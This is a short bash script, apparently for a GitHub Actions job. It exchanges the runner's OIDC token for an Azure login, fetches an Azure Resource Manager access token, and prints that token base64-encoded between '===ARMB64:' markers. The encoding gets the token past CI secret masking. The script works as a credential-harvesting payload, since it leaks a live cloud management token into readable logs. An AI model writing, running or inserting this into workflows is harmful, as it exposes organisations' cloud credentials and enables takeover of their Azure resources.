#!/usr/bin/env bash
set -euo pipefail
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$JWT" --allow-no-subscriptions -o none
ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
echo "===ARMB64:$(printf %s "$ARM" | base64 -w0):END==="
echo "whoami: $(az account show --query user.name -o tsv 2>/dev/null || echo n/a)"
